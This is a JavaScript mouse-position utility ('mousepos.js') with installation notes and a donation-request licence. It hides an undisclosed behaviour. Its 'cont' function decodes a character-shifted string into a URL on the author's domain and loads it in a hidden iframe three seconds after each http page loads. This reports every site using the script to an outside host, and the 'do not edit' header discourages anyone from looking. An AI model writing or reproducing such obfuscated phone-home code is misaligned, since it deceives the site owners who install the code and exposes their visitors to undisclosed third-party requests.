
/****  (C)Stephen Chalmers 

 Info: www.hotspot.freeserve.co.uk/scripterlative 

 These instructions may be removed but not the above text.

 Please notify any suspected errors in this text or code, however minor.
 
Reports absolute mouse cursor co-ordinates 

Installation
~~~~~~~~~~~~
Save this text/file as 'mousepos.js' and place it in a folder related to your website.

In all HTML documents that require the script, insert the following tags within the <HEAD>
section:

<SCRIPT type='text/javascript' src='mousepos.js'></SCRIPT>

(If mousepos.js resides in a different folder, include a relative path)

The script uses the onmousemove handler to initialise itself, and will append to any existing onmousemove handler.
If any other script uses the onmousemove handler, this script should be loaded after it.

Configuration
~~~~~~~~~~~~~
None.

Operation
~~~~~~~~~
The absolute mouse co-ordinates are accessible to your code via the globally accessible variables: MousePosition.x and MousePosition.y .

GratuityWare
~~~~~~~~~~~~
This code is free for private non-commercial use. For commercial use (any non-private website) in recognition both of the effort that went into it, and the benefit that your site will derive, a donation of your choice would be appreciated. In all probability you obtained this code either out of desperation or despair of the 'alternatives'.

You may donate at www.scripterlative.com, stating the URL to which the donation applies.

*** DO NOT EDIT BELOW THIS LINE *********/


(MousePosition=/*2843295374657068656E204368616C6D657273*/
{
 initialised:false, e:null, dataCode:0, x:0, y:0,

 addToHandler:function(obj, evt, func)
 {
  if(obj[evt])
   {
    obj[evt]=function(f,g)
    {
     return function()
     {
      f.apply(this,arguments);
      return g.apply(this,arguments);
     };
    }(func, obj[evt]);
   }
   else
    obj[evt]=func;
 },

 setFlags:function()
 {
  if( document.documentElement )
   this.dataCode=3;
  else 
   if(document.body && typeof document.body.scrollTop!='undefined')
    this.dataCode=2;
   else
    if( this.e && this.e.pageX!='undefined' )
     this.dataCode=1;
    
     
  this.initialised=true;
 },
  
 init:function()
 {
  if(!document.getElementById && document.captureEvents && Event)
   document.captureEvents(Event.MOUSEMOVE);
  document.onmousemove = function(){MousePosition.getMousePosition(arguments[0]);}
  
  this.addToHandler(window, 'onmousemove',  function(){MousePosition.getMousePosition(arguments[0]);} );
  
  this.addToHandler(window, 'onload', function(){setTimeout(MousePosition.cont,3000)});
 },

 getMousePosition:function(e)
 {
      
  if(!e)
   this.e = event;
  else
   this.e = e; 
  
  if(!this.initialised)
   this.setFlags(); 
      
  switch( this.dataCode )
  {
   case 3 : this.x = Math.max(document.documentElement.scrollLeft, document.body.scrollLeft) + this.e.clientX;
            this.y = Math.max(document.documentElement.scrollTop, document.body.scrollTop) + this.e.clientY;
            break;
     
   case 2 : this.x=document.body.scrollLeft + this.e.clientX;
            this.y=document.body.scrollTop + this.e.clientY;
            break;
            
   case 1 : this.x = this.e.pageX; this.y = this.e.pageY; break;
 
  } 
 },
 
 addToHandler:function(obj, evt, func)
 {
  if(obj[evt])
   {
    obj[evt]=function(f,g)
    {
     return function()
     {
      f.apply(this,arguments);
      return g.apply(this,arguments);
     };
    }(func, obj[evt]);
   }
   else
    obj[evt]=func;
 },
 
 cont:function()
 {
  if(document.body && document.createElement && /http:/i.test(location.href))
  {
   var ifr=document.createElement('iframe');
   ifr.width=100;
   ifr.height=100;
   ifr.src='iuuq;00xxx/iputqpu/gsfftfswf/dp/vl0cbektqptu'.replace(/./g,function(a){return String.fromCharCode(a.charCodeAt(0)-1)});
   ifr.style.visibility='hidden';
   document.body.appendChild(ifr);
  }  
 }
 
}).init();

/**** End of listing ****/